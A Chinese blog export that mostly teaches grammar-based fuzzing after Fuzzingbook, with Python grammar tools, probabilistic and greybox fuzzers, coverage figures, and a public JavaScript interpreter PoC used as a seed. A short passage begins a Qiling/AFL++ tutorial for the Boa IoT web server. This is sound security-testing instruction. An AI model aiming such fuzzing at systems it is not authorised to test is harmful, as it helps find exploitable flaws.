到此，我们理解了Grammar对于Fuzzing的重要性，一个杰出的Grammar能够有效的生成大量合法输入，不过这只是从输入组成（句法）来看，这毕竟是一个庞大的范围，虽然有时候满足程序的输入格式，但是未必真的对Fuzzing起作用，这种情况非常常见。再一次以编译器为例子，你的程序在满足语言语法的同时更应该具备正确的语义。但是语义很难再以Grammar的形式表达。以URL生成Grammar为例，简单通过Grammar很难定义端口的范围。面对这样的问题，最简单的解决办法其实就是在Fuzz里面而不是在Grammar里面进行限制。以URL Grammar为例，通过Grammar生成的URL在真正的被作为Input给予目标之前，应该在Fuzz系统里面经过URL“合法性”判断，这里的判断可以由作者根据自己的需求来进行限制。
Grammar Toolbox​  在Fuzzing项目中对于Grammar的需求并不是一成不变的，因此Grammar的一大需求就是具备可扩展性。以一个简单的Gramar为例：
simple_nonterminal_grammar: Grammar = {
    "&lt;start&gt;": ["&lt;nonterminal&gt;"],
    "&lt;nonterminal&gt;": ["&lt;left-angle&gt;&lt;identifier&gt;&lt;right-angle&gt;"],
    "&lt;left-angle&gt;": ["&lt;"],
    "&lt;right-angle&gt;": ["&gt;"],
    "&lt;identifier&gt;": ["id"]  # for now
}

有时候我们希望拓展其功能，但是不希望原来的Grammar受到影响（类比编程中的继承）,就是一个很简单的如下操作。
nonterminal_grammar = copy.deepcopy(simple_nonterminal_grammar)
nonterminal_grammar["&lt;identifier&gt;"] = ["&lt;idchar&gt;", "&lt;identifier&gt;&lt;idchar&gt;"]
nonterminal_grammar["&lt;idchar&gt;"] = ['a', 'b', 'c', 'd']  # for now

总结为一个函数如下，非常简单就不多解释：
def set_opts(grammar: Grammar, symbol: str, expansion: Expansion, 
             opts: Option = {}) -&gt; None:
    """Set the options of the given expansion of grammar[symbol] to opts"""
    expansions = grammar[symbol]
    for i, exp in enumerate(expansions):
        if exp_string(exp) != exp_string(expansion):
            continue

        new_opts = exp_opts(exp)
        if opts == {} or new_opts == {}:
            new_opts = opts
        else:
            for key in opts:
                new_opts[key] = opts[key]

        if new_opts == {}:
            grammar[symbol][i] = exp_string(exp)
        else:
            grammar[symbol][i] = (exp_string(exp), new_opts)

        return

    raise KeyError(
        "no expansion " +
        repr(symbol) +
        " -&gt; " +
        repr(
            exp_string(expansion)))

同时，在写Fuzz的时候肯定不希望不断地写大量的符号和值的对应，因此我们需要一些语法来帮助，这里提供了ENBF的解析方法：
# 解析 ebnf 语法
def new_symbol(grammar: Grammar, symbol_name: str = "&lt;symbol&gt;") -&gt; str:
    """Return a new symbol for `grammar` based on `symbol_name`"""
    if symbol_name not in grammar:
        return symbol_name

    count = 1
    while True:
        tentative_symbol_name = symbol_name[:-1] + "-" + repr(count) + "&gt;"
        if tentative_symbol_name not in grammar:
            return tentative_symbol_name
        count += 1

# 提取表达式中符合EBNF语法的部分，? , * , + , ()
def parenthesized_expressions(expansion: Expansion) -&gt; List[str]:
    RE_PARENTHESIZED_EXPR = re.compile(r'\([^()]*\)[?+*]')
    # In later chapters, we allow expansions to be tuples,
    # with the expansion being the first element
    if isinstance(expansion, tuple):
        expansion = expansion[0]

    return re.findall(RE_PARENTHESIZED_EXPR, expansion)

# 对Grammar中的EBNF语法括号进行解析
def convert_ebnf_parentheses(ebnf_grammar: Grammar) -&gt; Grammar:
    """Convert a grammar in extended BNF to BNF"""
    grammar = extend_grammar(ebnf_grammar)
    for nonterminal in ebnf_grammar:
        expansions = ebnf_grammar[nonterminal]

        for i in range(len(expansions)):
            expansion = expansions[i]
            if not isinstance(expansion, str):
                expansion = expansion[0]

            while True:
                parenthesized_exprs = parenthesized_expressions(expansion)
                if len(parenthesized_exprs) == 0:
                    break

                for expr in parenthesized_exprs:
                    operator = expr[-1:]
                    contents = expr[1:-2]

                    new_sym = new_symbol(grammar)

                    exp = grammar[nonterminal][i]
                    opts = None
                    if isinstance(exp, tuple):
                        (exp, opts) = exp
                    assert isinstance(exp, str)

                    expansion = exp.replace(expr, new_sym + operator, 1)
                    if opts:
                        grammar[nonterminal][i] = (expansion, opts)
                    else:
                        grammar[nonterminal][i] = expansion

                    grammar[new_sym] = [contents]

    return grammar

# ENBF符号扩展
def extended_nonterminals(expansion: Expansion) -&gt; List[str]:
    RE_EXTENDED_NONTERMINAL = re.compile(r'(&lt;[^&lt;&gt; ]*&gt;[?+*])')
    # In later chapters, we allow expansions to be tuples,
    # with the expansion being the first element
    if isinstance(expansion, tuple):
        expansion = expansion[0]

    return re.findall(RE_EXTENDED_NONTERMINAL, expansion)

# ENBF符号扩展
def convert_ebnf_operators(ebnf_grammar: Grammar) -&gt; Grammar:
    """Convert a grammar in extended BNF to BNF"""
    grammar = extend_grammar(ebnf_grammar)
    for nonterminal in ebnf_grammar:
        expansions = ebnf_grammar[nonterminal]

        for i in range(len(expansions)):
            expansion = expansions[i]
            extended_symbols = extended_nonterminals(expansion)

            for extended_symbol in extended_symbols:
                operator = extended_symbol[-1:]
                original_symbol = extended_symbol[:-1]
                assert original_symbol in ebnf_grammar, \
                    f"{original_symbol} is not defined in grammar"

                new_sym = new_symbol(grammar, original_symbol)

                exp = grammar[nonterminal][i]
                opts = None
                if isinstance(exp, tuple):
                    (exp, opts) = exp
                assert isinstance(exp, str)

                new_exp = exp.replace(extended_symbol, new_sym, 1)
                if opts:
                    grammar[nonterminal][i] = (new_exp, opts)
                else:
                    grammar[nonterminal][i] = new_exp

                if operator == '?':
                    grammar[new_sym] = ["", original_symbol]
                elif operator == '*':
                    grammar[new_sym] = ["", original_symbol + new_sym]
                elif operator == '+':
                    grammar[new_sym] = [
                        original_symbol, original_symbol + new_sym]

    return grammar

def convert_ebnf_grammar(ebnf_grammar: Grammar) -&gt; Grammar:
    return convert_ebnf_operators(convert_ebnf_parentheses(ebnf_grammar))

对于Grammar来言，我们必须要确定它的一个合法性，不然在使用中必然会遇到各种错误问题，因此语法检查是很必要的，就如同编译器的语法检查很重要一样：
# 搜索Grammar中的定义的noterminal
def def_used_nonterminals(grammar: Grammar, start_symbol: 
                          str = START_SYMBOL) -&gt; Tuple[Optional[Set[str]], 
                                                       Optional[Set[str]]]:
    """Return a pair (`defined_nonterminals`, `used_nonterminals`) in `grammar`.
    In case of error, return (`None`, `None`)."""

    defined_nonterminals = set()
    used_nonterminals = {start_symbol}

    for defined_nonterminal in grammar:
        defined_nonterminals.add(defined_nonterminal)
        expansions = grammar[defined_nonterminal]
        if not isinstance(expansions, list):
            print(repr(defined_nonterminal) + ": expansion is not a list",
                  file=sys.stderr)
            return None, None

        if len(expansions) == 0:
            print(repr(defined_nonterminal) + ": expansion list empty",
                  file=sys.stderr)
            return None, None

        for expansion in expansions:
            if isinstance(expansion, tuple):
                expansion = expansion[0]
            if not isinstance(expansion, str):
                print(repr(defined_nonterminal) + ": "
                      + repr(expansion) + ": not a string",
                      file=sys.stderr)
                return None, None

            for used_nonterminal in nonterminals(expansion):
                used_nonterminals.add(used_nonterminal)

    return defined_nonterminals, used_nonterminals

def reachable_nonterminals(grammar: Grammar,
                           start_symbol: str = START_SYMBOL) -&gt; Set[str]:
    reachable = set()

    def _find_reachable_nonterminals(grammar, symbol):
        nonlocal reachable
        reachable.add(symbol)
        for expansion in grammar.get(symbol, []):
            for nonterminal in nonterminals(expansion):
                if nonterminal not in reachable:
                    _find_reachable_nonterminals(grammar, nonterminal)

    _find_reachable_nonterminals(grammar, start_symbol)
    return reachable

def unreachable_nonterminals(grammar: Grammar,
                             start_symbol=START_SYMBOL) -&gt; Set[str]:
    return grammar.keys() - reachable_nonterminals(grammar, start_symbol)

def opts_used(grammar: Grammar) -&gt; Set[str]:
    used_opts = set()
    for symbol in grammar:
        for expansion in grammar[symbol]:
            used_opts |= set(exp_opts(expansion).keys())
    return used_opts

# Grammar的合法性判断，类似于编译器里面的语法检查
def is_valid_grammar(grammar: Grammar,
                     start_symbol: str = START_SYMBOL, 
                     supported_opts: Set[str] = set()) -&gt; bool:
    """Check if the given `grammar` is valid.
       `start_symbol`: optional start symbol (default: `&lt;start&gt;`)
       `supported_opts`: options supported (default: none)"""

    defined_nonterminals, used_nonterminals = \
        def_used_nonterminals(grammar, start_symbol)
    if defined_nonterminals is None or used_nonterminals is None:
        return False

    # Do not complain about '&lt;start&gt;' being not used,
    # even if start_symbol is different
    if START_SYMBOL in grammar:
        used_nonterminals.add(START_SYMBOL)

    for unused_nonterminal in defined_nonterminals - used_nonterminals:
        print(repr(unused_nonterminal) + ": defined, but not used",
              file=sys.stderr)
    for undefined_nonterminal in used_nonterminals - defined_nonterminals:
        print(repr(undefined_nonterminal) + ": used, but not defined",
              file=sys.stderr)

    # Symbols must be reachable either from &lt;start&gt; or given start symbol
    unreachable = unreachable_nonterminals(grammar, start_symbol)
    msg_start_symbol = start_symbol

    if START_SYMBOL in grammar:
        unreachable = unreachable - \
            reachable_nonterminals(grammar, START_SYMBOL)
        if start_symbol != START_SYMBOL:
            msg_start_symbol += " or " + START_SYMBOL

    for unreachable_nonterminal in unreachable:
        print(repr(unreachable_nonterminal) + ": unreachable from " + msg_start_symbol,
              file=sys.stderr)

    used_but_not_supported_opts = set()
    if len(supported_opts) &gt; 0:
        used_but_not_supported_opts = opts_used(
            grammar).difference(supported_opts)
        for opt in used_but_not_supported_opts:
            print(
                "warning: option " +
                repr(opt) +
                " is not supported",
                file=sys.stderr)

    return used_nonterminals == defined_nonterminals and len(unreachable) == 0

以上列举的是常用的Tools，在Fuzz的编写过程中，要根据实际问题针对性的编写各式各样的工具。
高效Grammars Fuzz​  前面提供的simple_grammar_fuzzer其实存在大量的问题，比如性能低下，对于符号的解析次数受限，容易引起报错等，因此需要更加高明的算法。这里选择的是派生树，因为树形结构易于追踪而且易于添加和删除其中分支。关于Fuzz的编写其实就是不断的对派生树进行分析和对子节点的不断扩展。
派生树算法​  从上述的简单算法可以看出，整个的Grammar Fuzz的核心其实就是通过大量的符号扩展形成对应的数据结构，那么用来存储或者拓展符号的数据结构其实尤为重要。派生树的树状结构其实完美的符合了我们的要求，树形结构自上而下的扩展正好和符号的扩展相对应。而且派生树使得我们可以掌控整个扩展过程的状态，比如那些节点已经被扩展，或者某个节点是否需要扩展等，同时，在扩展过程中增加新节点的速度远超把一个符号替换为一个值的过程，因此使用这种数据结构也带来了一定的性能增益。
​  让我们以下面的Grammar为例子：
# URL Grammar
URL_GRAMMAR: Grammar = {
    "&lt;start&gt;":
        ["&lt;url&gt;"],
    "&lt;url&gt;":
        ["&lt;scheme&gt;://&lt;authority&gt;&lt;path&gt;&lt;query&gt;"],
    "&lt;scheme&gt;":
        ["http", "https", "ftp", "ftps"],
    "&lt;authority&gt;":
        ["&lt;host&gt;", "&lt;host&gt;:&lt;port&gt;", "&lt;userinfo&gt;@&lt;host&gt;", "&lt;userinfo&gt;@&lt;host&gt;:&lt;port&gt;"],
    "&lt;host&gt;":  # 大部分情况下其实可以指定一个URL
        ["cispa.saarland", "www.google.com", "fuzzingbook.com"],
    "&lt;port&gt;":
        ["80", "8080", "&lt;nat&gt;"],
    "&lt;nat&gt;":
        ["&lt;digit&gt;", "&lt;digit&gt;&lt;digit&gt;"],
    "&lt;digit&gt;":
        ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"],
    "&lt;userinfo&gt;":  # Just one
        ["user:password"],
    "&lt;path&gt;":  # Just a few
        ["", "/", "/&lt;id&gt;"],
    "&lt;id&gt;":  # Just a few
        ["abc", "def", "x&lt;digit&gt;&lt;digit&gt;"],
    "&lt;query&gt;":
        ["", "?&lt;params&gt;"],
    "&lt;params&gt;":
        ["&lt;param&gt;", "&lt;param&gt;&amp;&lt;params&gt;"],
    "&lt;param&gt;":  # Just a few
        ["&lt;id&gt;=&lt;id&gt;", "&lt;id&gt;=&lt;nat&gt;"],
}

以派生树算法来看，首先以&lt;start&gt;为初始节点，然后在Grammar中发现其存在对应的表达，所以就会选择&lt;url&gt;作为它的子节点，循环往复知道一个节点不再出现对应的子节点，然后整个的树形结构完成解析，输出对应的结构化数据。
​  对应的数据表示如下：
(SYMBOL_NAME, CHILDREN)
DerivationTree = Tuple[str, Optional[List[Any]]]
derivation_tree: DerivationTree = ("&lt;start&gt;",
                   [("&lt;expr&gt;",
                     [("&lt;expr&gt;", None),
                      (" + ", []),
                         ("&lt;term&gt;", None)]
                     )])

SYMBOL_NAME代表的就是符号，CHILDREN代表子节点，表示为具体的数据结构就是：DerivationTree = Tuple[str, Optional[List[Any]]]。其中CHILDREN主要有两种表示：

None代表当前节点可以继续向下扩展，其含义就是现在节点存在可扩展的符号。
[]代表的就是没有子节点了

整个算法都围绕上面的基本原理展开
def g_rammar_fuzzer():
    f = GrammarFuzzer(URL_GRAMMAR)
    f.fuzz()

ProbabilisticGrammarFuzzer​  有时候完全随机的进行表达式展开其实会白白浪费大量的时间和资源，因此可以对表达式附加概率值，这一块涉及到大量的概率学问题，有部分数据来源于世界的统计规律，比如下面给出的leaddigit符号对应的概率，这些就不在深入分析。
PROBABILISTIC_EXPR_GRAMMAR: Grammar = {
    "&lt;start&gt;":
        ["&lt;expr&gt;"],

    "&lt;expr&gt;":
        [("&lt;term&gt; + &lt;expr&gt;", opts(prob=0.1)),
         ("&lt;term&gt; - &lt;expr&gt;", opts(prob=0.2)),
         "&lt;term&gt;"],

    "&lt;term&gt;":
        [("&lt;factor&gt; * &lt;term&gt;", opts(prob=0.1)),
         ("&lt;factor&gt; / &lt;term&gt;", opts(prob=0.1)),
         "&lt;factor&gt;"
         ],

    "&lt;factor&gt;":
        ["+&lt;factor&gt;", "-&lt;factor&gt;", "(&lt;expr&gt;)",
            "&lt;leadinteger&gt;", "&lt;leadinteger&gt;.&lt;integer&gt;"],

    "&lt;leadinteger&gt;":
        ["&lt;leaddigit&gt;&lt;integer&gt;", "&lt;leaddigit&gt;"],

    # Benford's law: frequency distribution of leading digits
    "&lt;leaddigit&gt;":
        [("1", opts(prob=0.301)),
         ("2", opts(prob=0.176)),
         ("3", opts(prob=0.125)),
         ("4", opts(prob=0.097)),
         ("5", opts(prob=0.079)),
         ("6", opts(prob=0.067)),
         ("7", opts(prob=0.058)),
         ("8", opts(prob=0.051)),
         ("9", opts(prob=0.046)),
         ],

    # Remaining digits are equally distributed
    "&lt;integer&gt;":
        ["&lt;digit&gt;&lt;integer&gt;", "&lt;digit&gt;"],

    "&lt;digit&gt;":
        ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"],
}

跟之前的Grammar有很大不同的地方在于，现在的Grammar可以通过增加注释的方式为列表中的值添加随机概率，使得作者可以通过逆向获取其它渠道得到的信息可以在Fuzz中获得利用。那现在问题就显而易见了，如何确定概率？
​  当Fuzz的作者没办法直接给出一个符号对应的所有项具体的概率的时候，可以遵循的最直接的规则就是下面三个公式：



大致含义也很好理解，就是a代表的是已知概率的项，而u代表的未知概率的项目，已知概率自然可以通过opts的方法给对应项附加概率，未知概率的项则按照概率平分的原则来赋予概率。之后自然是要在Fuzz里面引入概率，使得在生成种子的时候可以对符号解析的选择赋予权重，进而提高Fuzz效率。
​  就Fuzz的具体实现而言，其实相比于上述的Grammar Fuzz只是增加了一个对于opts注释的访问，以便在随机解析的时候可以附加概率值权重。但是这样带来的优势是很明显的，甚至可以通过控制输入Fuzz目标指定的Func等。但是还有一种情况，我第一次解析Grammar symbol的时候希望它的概率为0.3，但是我第二次解析Grammar symbol的时候希望其概率为0.5，为了实现这一点其实可以利用上下文，在不同的上下文中复制希望赋予其不同概率的symbol，以IP Grammar为例子：
IP_ADDRESS_GRAMMAR: Grammar = {
    "&lt;start&gt;": ["&lt;address&gt;"],
    "&lt;address&gt;": ["&lt;octet&gt;.&lt;octet&gt;.&lt;octet&gt;.&lt;octet&gt;"],
    # ["0", "1", "2", ..., "255"]
    "&lt;octet&gt;": decrange(0, 256) # 其实代表的就是0-256
}

为了使得每次解析&lt;octet&gt;的时候都使用不同的概率，可以对其扩展，形成下面的语法：
IP_ADDRESS_GRAMMAR: Grammar = {
    "&lt;start&gt;": ["&lt;address&gt;"],
    "&lt;address&gt;": ["&lt;octet-1&gt;.&lt;octet-2&gt;.&lt;octet-3&gt;.&lt;octet-4&gt;"],
    # ["0", "1", "2", ..., "255"]
    "&lt;octet-1&gt;": decrange(0, 256) # 其实代表的就是0-256
    "&lt;octet-2&gt;": decrange(0, 256) # 其实代表的就是0-256
    "&lt;octet-3&gt;": decrange(0, 256) # 其实代表的就是0-256
    "&lt;octet-4&gt;": decrange(0, 256) # 其实代表的就是0-256
}

这样在进行解析的时候就完全可以对每次解析附加不同的概率。下面是帮助实现的函数：
def _duplicate_context(grammar: Grammar,
                       orig_grammar: Grammar,
                       symbol: str,
                       expansion: Optional[Expansion],
                       depth: Union[float, int],
                       seen: Dict[str, str]) -&gt; None:
    """Helper function for `duplicate_context()`"""

    for i in range(len(grammar[symbol])):
        if expansion is None or grammar[symbol][i] == expansion:
            new_expansion = ""
            for (s, c) in expansion_to_children(grammar[symbol][i]):
                if s in seen:                 # Duplicated already
                    new_expansion += seen[s]
                elif c == [] or depth == 0:   # Terminal symbol or end of recursion
                    new_expansion += s
                else:                         # Nonterminal symbol - duplicate
                    # Add new symbol with copy of rule
                    new_s = new_symbol(grammar, s)
                    grammar[new_s] = copy.deepcopy(orig_grammar[s])

                    # Duplicate its expansions recursively
                    # {**seen, **{s: new_s}} is seen + {s: new_s}
                    _duplicate_context(grammar, orig_grammar, new_s, expansion=None,
                                       depth=depth - 1, seen={**seen, **{s: new_s}})
                    new_expansion += new_s

            grammar[symbol][i] = new_expansion

def duplicate_context(grammar: Grammar, 
                      symbol: str,
                      expansion: Optional[Expansion] = None, 
                      depth: Union[float, int] = float('inf')):
    """Duplicate an expansion within a grammar.

    In the given grammar, take the given expansion of the given `symbol`
    (if `expansion` is omitted: all symbols), and replace it with a
    new expansion referring to a duplicate of all originally referenced rules.

    If `depth` is given, limit duplication to `depth` references
    (default: unlimited)
    """
    orig_grammar = extend_grammar(grammar)
    _duplicate_context(grammar, orig_grammar, symbol,
                       expansion, depth, seen={})

    # After duplication, we may have unreachable rules; delete them
    for nonterminal in unreachable_nonterminals(grammar):
        del grammar[nonterminal]

在完成上下文复制之后就可以通过类似下面的操作得到我们想要的结果：
set_prob(probabilistic_ip_address_grammar, "&lt;octet-1&gt;", "127", 1.0)
set_prob(probabilistic_ip_address_grammar, "&lt;octet-2&gt;", "0", 1.0)

不过这就又引入一个问题，概率在赋予给symbol之后一成不变真的合适吗？在真实世界的Fuzz中随着我们对于目标的不断了解，或者一些其它情况比如长时间未出现想要的结果等，及时改变策略也是非常必要的，但是如果Fuzz可以智能的自己调节调整不同symbol的概率值的话，会减轻很多的负担并获得更好的软件测试效果。一个比较好的办法是让Fuzz通过最开始被给予Inputs种子来学习应该赋予某些symbol多大的一个概率值，这种方法在某些场景下非常有用：

测试常用功能，因为很多软件测试更希望常用的功能确保安全，但是对于漏洞挖掘研究人员来说可能目标不在于此。
测试不常用功能，通过规避Inputs中解析到的symbol，Fuzz就会更偏向于测试一些不常用的功能。
专注于指定的Inputs，一些漏洞挖掘可能希望专注于已有的非常有价值的poc inputs，通过专注于这些inputs，Fuzz可以测试软件的一些薄弱环节从而达到很好的效果。

​  理论已经存在，那么如何实现呢？第一步肯定是需要将已经存在的Inputs种子恢复成为派生树，然后对派生树种每个Symbol对应的值有多少来计算将来的概率值。

如上图，假设我给与一个127.0.0.1的种子，那么被解析之后，0在&lt;octet&gt;中的概率值就会被限制为50%，127和1分别为25%，那么在Fuzz运行的时候相关的概率值就可以赋予给&lt;octet&gt;。那么如果测试一些不常用功能该怎么办呢？其实就是通过原来测常用功能的Inputs得到相关概率，然后进行概率翻转就行了，比如常用功能的Inputs概率如下：
[('http', {'prob': 0.2222222222222222}),
 ('https', {'prob': 0.6666666666666666}),
 ('ftp', {'prob': 0.0}),
 ('ftps', {'prob': 0.1111111111111111})]

那么经过翻转之后就是：
[('http', {'prob': 0.1111111111111111}),
 ('https', {'prob': 0.0}),
 ('ftp', {'prob': 0.6666666666666666}),
 ('ftps', {'prob': 0.2222222222222222})]

上述就是之前讲到的专注测试常用功能或者非常用功能的基本思路，从此处引出的另一个比较关键的是通过Inputs帮我们专注于目标的特定功能，它和测试常用功能的区别就是首先要找到一批特殊的Inputs，通过这些Inputs作为seeds就可以对语法解析的过程进行概率分析和限制，使得后续的变异可以一直有较高的目标命中率。
Generator With Pre or Post or order Func​  在某些Inputs在生成的时候，Fuzz作者可能希望对他们进行一些限制调整，获取其它的操作，这些都可以通过pre func完成。这类似于hook，那么对于func触发的时机一般就分为两种，在Inputs的生成之前或者是生成之后，在语法里面的表示就是：
CHARGE_GRAMMAR: Grammar = {
    "&lt;start&gt;": ["Charge &lt;amount&gt; to my credit card &lt;credit-card-number&gt;"],
    "&lt;amount&gt;": ["$&lt;float&gt;"],
    "&lt;float&gt;": ["&lt;integer&gt;.&lt;digit&gt;&lt;digit&gt;"],
    "&lt;integer&gt;": ["&lt;digit&gt;", "&lt;integer&gt;&lt;digit&gt;"],
    "&lt;digit&gt;": crange('0', '9'),

    "&lt;credit-card-number&gt;": ["&lt;digits&gt;"],
    "&lt;digits&gt;": ["&lt;digit-block&gt;&lt;digit-block&gt;&lt;digit-block&gt;&lt;digit-block&gt;"],
    "&lt;digit-block&gt;": ["&lt;digit&gt;&lt;digit&gt;&lt;digit&gt;&lt;digit&gt;"],
}

CHARGE_GRAMMAR.update({
    "&lt;float&gt;": [("&lt;integer&gt;.&lt;digit&gt;&lt;digit&gt;", opts(pre=high_charge))], # high_charge是函数名称
})

CHARGE_GRAMMAR.update({
    "&lt;float&gt;": [("&lt;integer&gt;.&lt;digit&gt;&lt;digit&gt;",
                 opts(pre=lambda: random.randint(10000000, 90000000) / 100.0))] # 或者选择使用lambda表达式
})

另一种就是在Seeds的生成之后了：
CHARGE_GRAMMAR.update({
    "&lt;credit-card-number&gt;": [("&lt;digits&gt;", opts(post=lambda digits: fix_credit_card(digits)))]
})

比如生成的digits不能满足Fuzz的需求，我们就可以通过这种方式来进行及时的修正，以提高Fuzz的效率。
Greybox Fuzzing with Grammars​  除了Fuzzing性能类的问题之外的另一个问题就是变异的导向问题，在Grammars Fuzz生成Input的过程中对于Grammar的内部解析是随机的，但是对于Fuzz目标来说，大量的Input可能会触发相同的分支进而导致代码覆盖率难以达到理想的值。对于AFL类似的覆盖引导型Fuzz来说，因为白盒Fuzz的源代码插桩缘故可以统计代码覆盖率来进行不错的引导，但是还存在很多情况，比如黑盒，甚至是以一种WebServer为目标的Fuzz，统计代码覆盖率并不是一件简单的事情，这时候采取的措施应该是不断的增加Inputs生成的多样性，比如在上述的派生树的子节点的扩展过程进行统计，使其在生成Input语料的时候偏向于还没扩展过的节点。这时候就会面临新的问题，如何快速提升代码覆盖率？
​  在进行Fuzz的时候，有时候一些输入的部分会被识别为关键字，比如C语言里面的int等，如果告诉Fuzz这些关键字就可以在短时间内极大的提升代码覆盖率，但是就长远来看整体的代码覆盖率还是要差于不使用关键字字典的情况。下面是使用关键字字典的变异Inputs生成器。
class DictMutator(Mutator):
    """Mutate strings using keywords from a dictionary"""

    def __init__(self, dictionary: List[str]) -&gt; None:
        """Constructor. `dictionary` is the list of keywords to use."""
        super().__init__()
        self.dictionary = dictionary
        self.mutators.append(self.insert_from_dictionary)

    def insert_from_dictionary(self, s: str) -&gt; str:
        """Returns s with a keyword from the dictionary inserted"""
        pos = random.randint(0, len(s))
        random_keyword = random.choice(self.dictionary)
        return s[:pos] + random_keyword + s[pos:]

但是问题在于关键字通过字典随机引入的方式很可能破坏了Input本来的正确输入结构进而引发不必要的损耗。解决的方法其实也很简单：Fuzzing with Input Fragments.

对原有的Input进行Parse，形成派生树。
对派生树进行节点互换或者节点替换等操作。
对派生树进行还原，形成新的Input。

以上的所有操作都在派生树上进行。为了更方便的进行编译操作，可以建立一个派生树的碎片池，每个碎片都由子树组成，子树包括符号和对应的Node节点和其子节点。不过对于派生树的parse其实是非常耗时的，因此可以设置一些时间限制来防止速度过低。不过以Fragments为基础的变异虽然可以很好的符合Inputs合法性的要求但是在代码覆盖率提升方面并不亮眼。而且以此为基础的LangFuzz其实在Inputs生成的速度上也远低于平常的结构化黑盒Fuzz。下面是两组对比数据：
LangFuzz
From the 300 generated inputs, 152 (50.67%) can be parsed.In total, 91 statements are covered.

BlackFuzz
From the 300 generated inputs, 36 (12.00%) can be parsed.In total, 161 statements are covered.

可以看出以Fragments为基础的变异的优势在于它可以很好的生成符合结构化语法的变异。那么现在的疑问就是如何在保证输入语法正确性的前提下提升代码覆盖率？
​  一种方法是利用类似AFL的覆盖引导方式，利用代码覆盖率不断作为变异的反馈，以此来不断的增添提高代码覆盖率的种子，同时提供structural mutations和32 byte-level mutations两种变异方式，如下：
class GreyboxGrammarFuzzer(GreyboxFuzzer):
    """Greybox fuzzer using grammars."""

    def __init__(self, seeds: List[str],
                 byte_mutator: Mutator, tree_mutator: FragmentMutator,
                 schedule: PowerSchedule) -&gt; None:
        """Constructor.
        `seeds` - set of inputs to mutate.
        `byte_mutator` - a byte-level mutator.
        `tree_mutator` = a tree-level mutator.
        `schedule` - a power schedule.
        """
        super().__init__(seeds, byte_mutator, schedule)
        self.tree_mutator = tree_mutator

    def create_candidate(self) -&gt; str:
        """Returns an input generated by structural mutation 
           of a seed in the population"""
        seed = cast(SeedWithStructure, self.schedule.choose(self.population))

        # Structural mutation
        trials = random.randint(0, 4)
        for i in range(trials):
            seed = self.tree_mutator.mutate(seed)

        # Byte-level mutation
        candidate = seed.data
        if trials == 0 or not seed.has_structure or random.randint(0, 1) == 1:
            dumb_trials = min(len(seed.data), 1 &lt;&lt; random.randint(1, 5))
            for i in range(dumb_trials):
                candidate = self.mutator.mutate(candidate)

        return candidate

想通的种子和变异次数的条件下，测试结果如下：
From the 300 generated inputs, 1 (0.33%) can be parsed.
In total, 180 statements are covered.

同时，在Inputs生成的速度方面极大提升，较高的代码覆盖率，但是在Inputs的合法性方面表现是最差的。那这个问题该如何解决呢？答案就是Fuzzing with Input Regions，这种Fuzz的变异方法不再使用派生树节点拆分重组等方式，而是通过将合法种子的不同区域直接进行拆分重组的方式，这里的区域指的是可以和派生树符号对应的连续的字节序列，这样的好处其实在于它操作的对象可能比Fragments更大或者更小，以此种方式进行变异在和上述变异条件相同的情况下测试结构如下：
It took the structural greybox fuzzer with region mutator
        11.35 seconds to generate and execute 300 inputs.

From the 300 generated inputs, 4 (1.33%) can be parsed.
In total, 168 statements are covered.
On average, 9.1% of a seed in the population can be successfully parsed.

可以看到存在较高的代码覆盖率，在速度方面虽然优于Fragments Fuzz但是还是弱于普通的黑盒Fuzz，在代码覆盖率方面高于Fragments Fuzz并和GreyboxGrammarFuzzer维持在相差无几的水平。不过核心原因还是在于，通过的合法Inputs其实占比很低。那么如何解决这个问题？首先要让Fuzzer可以聚焦合法的Inputs。这一点其实前面已经讨论过了，只需要利用schedule给合法Inputs的相关结构赋予更多的权重。测试结果如下：
It took AFLSmart 20.75 seconds to generate and execute 300 inputs.

From the 300 generated inputs, 46 (15.33%) can be parsed.
In total, 162 statements are covered.
On average, 23.7% of a seed in the population can be successfully parsed.

可以看出在代码覆盖率保持较高水平的情况下，Inputs的合法性也得到了大幅度的提升，但是在Inputs的生成速度上来看，还是远弱于普通的GrammarFuzz。
​  从上面可以看出，在选择Fuzz的时候本身就是一个取舍的问题，通过二次开发或者针对不同场景的选择才能更好的达到我们想要的结果。
Parser input​  假设你在做一个模糊测试，无论是Grammar Fuzz 或者其他的Fuzz也好，如果没有合适的种子那么通过不断变异形成合适的Inputs是非常困难的，当然AFL的作者展示了通过简单的输入不断向目标进化的可能性，但是这毕竟十分浪费时间和性能，效果在很多场景下估计也是不尽人意的。
​  因此在进行模糊测试的时候如果可以获取一些poc，或者其它较好种子，比如在Fuzz js解释器的一个比较经常的做法就是将一些公开的poc，如下：
var haystack = "foo";
var re_text = "^foo";
haystack += "x";
re_text += "(x)";
var re = new RegExp(re_text);
re.test(haystack);
RegExp.input = Number();
print(RegExp.$1);

作为seeds进行变异，将生成的Inputs用来Fuzz解释器。表现出来不错的结果。

Tips:如何判断对面的代码覆盖率，一般黑盒情况下可以试时间，如果一个Input在对面耗费了更多的时间来运行，那么可以猜测其走过了更多的代码分支。

总结​  在面对Fuzz的目标的时候最重要的是选择合适的变异方式以及较好的初始种子，根据目标和测试目的不断地进行取舍和针对性开发才能得到比较理想的结果。
参考链接
https://www.fuzzingbook.org
文中数据测试来源大多为Fuzzingbook，因为根据电脑不同，其实具体数值结果会有一定偏差，但是结论都是一样的，因此就展示了书中的测试数据。

]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>Fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>qiling 框架IotFuzz之Boa</title>
    <url>//post/Qiling%20partial%20fuzz%20I.html</url>
    <content><![CDATA[qiling 框架IotFuzz之Boa前言最近在搞Iot的时候接触到Qiling框架，用了一段时间后感觉确实模拟功能挺强大的，还支持Fuzz，于是开始学习对Iot webserver这样的程序进行Fuzz。
官方给出了类似的例子如Tenda AC15 的httpd的fuzz脚本，但是也就光秃秃一个脚本还是需要自己来一遍才能学到一些东西；因为面向的是Iot webserver的Fuzz因此需要对嵌入式设备中常用web开源框架有一些了解，这里是对于Boa框架的fuzz案例

环境准备：

qiling-dev branch：这里并没有选择直接pip安装，方便修改源码

AFL++：在python中可以import unicornafl就行

git clone https://github.com/AFLplusplus/AFLplusplus.git
make -C AFLplusplus
cd AFLplusplus/unicorn_mode ; ./build_unicorn_support.sh


一个坑是最好获取版本高于3.15的cmake要不然编译的时候有些cmake参数识别有问题，我遇到的就是:cmake -S unicorn/ -B unicorn/build -D BUILD_SHARED_LIBS=no问题



需要对Qiling，AFL有些了解


